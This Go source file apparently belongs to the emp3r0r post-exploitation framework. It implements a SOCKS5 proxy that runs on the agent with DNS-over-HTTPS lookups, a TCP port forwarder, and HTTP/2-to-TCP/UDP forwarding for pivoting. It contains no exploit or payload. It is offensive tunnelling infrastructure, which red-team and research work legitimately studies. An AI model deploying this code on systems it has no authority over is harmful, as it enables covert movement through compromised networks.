package transport

import (
	"context"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/ncruces/go-dns"
	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

// StartSocks5Proxy sock5 proxy server on agent, listening on addr
func StartSocks5Proxy(addr, doh string, proxyserver *socks5.Server, onListen func(net.Listener)) (err error) {
	if doh != "" {
		// use DoH resolver
		net.DefaultResolver, err = dns.NewDoHResolver(
			doh,
			dns.DoHCache())
		if err != nil {
			return fmt.Errorf("Socks5Proxy DoHResolver: %v", err)
		}
	}

	socks5.Debug = true
	logging.Infof("Socks5Proxy started on %s", addr)
	l, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("Socks5Proxy listen: %v", err)
	}
	if onListen != nil {
		onListen(l)
	}

	for {
		c, err := l.Accept()
		if err != nil {
			return fmt.Errorf("Socks5Proxy accept: %v", err)
		}
		go func(c net.Conn) {
			defer c.Close()
			if err := proxyserver.Negotiate(c); err != nil {
				return
			}
			r, err := proxyserver.GetRequest(c)
			if err != nil {
				return
			}
			if err := proxyserver.Handle.TCPHandle(proxyserver, c.(*net.TCPConn), r); err != nil {
				logging.Debugf("Socks5Proxy handle: %v", err)
			}
		}(c)
	}
}

// TCPFwd listen on a TCP port and forward to another TCP address
// addr: forward to this addr
// port: listen on this port
func TCPFwd(addr, port string, ctx context.Context, cancel context.CancelFunc) (err error) {
	defer func() {
		logging.Printf("%s <- 0.0.0.0:%s exited", addr, port)
		cancel()
	}()
	serveConn := func(conn net.Conn) {
		dst, dialErr := net.Dial("tcp", addr)
		if dialErr != nil {
			logging.Print(dialErr)
			return
		}
		defer dst.Close()
		defer conn.Close()

		// IO copy
		go func() {
			_, dialErr = io.Copy(dst, conn)
			if dialErr != nil {
				logging.Print(dialErr)
			}
		}()
		go func() {
			_, dialErr = io.Copy(conn, dst)
			if dialErr != nil {
				logging.Print(dialErr)
			}
		}()

		// wait to be canceled
		for ctx.Err() == nil {
			time.Sleep(time.Duration(20) * time.Millisecond)
		}
	}
	logging.Printf("[+] Serving %s on 0.0.0.0:%s...", addr, port)
	l, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		logging.Printf("unable to listen on 0.0.0.0:%s: %v", port, err)
		return
	}
	for ctx.Err() == nil {
		lconn, err := l.Accept()
		if err != nil {
			logging.Print(err)
			continue
		}
		go serveConn(lconn)
	}
	return
}

// FwdToDport forward request to agent-side destination, h2 <-> tcp/udp
func FwdToDport(ctx context.Context, cancel context.CancelFunc,
	to, sessionID, protocol string, h2 *h2conn.Conn, timeout int,
) {
	var err error

	// connect to target port
	dest, err := net.Dial(protocol, to)
	defer func() {
		if dest != nil {
			dest.Close()
		}
		cancel()
		logging.Printf("FwdToDport %s (%s) exited", to, protocol)
	}()
	if err != nil {
		logging.Printf("FwdToDport %s (%s): %v", to, protocol, err)
		return
	}
	logging.Printf("FwdToDport: connected to %s (%s)", to, protocol)

	// io.Copy
	go func() {
		_, err = io.Copy(dest, h2)
		if err != nil {
			logging.Printf("FwdToDport %s (%s): h2 -> dest: %v", protocol, sessionID, err)
			return
		}
	}()
	_, err = io.Copy(h2, dest)
	if err != nil {
		logging.Printf("FwdToDport %s (%s): dest -> h2: %v", protocol, sessionID, err)
		return
	}
}
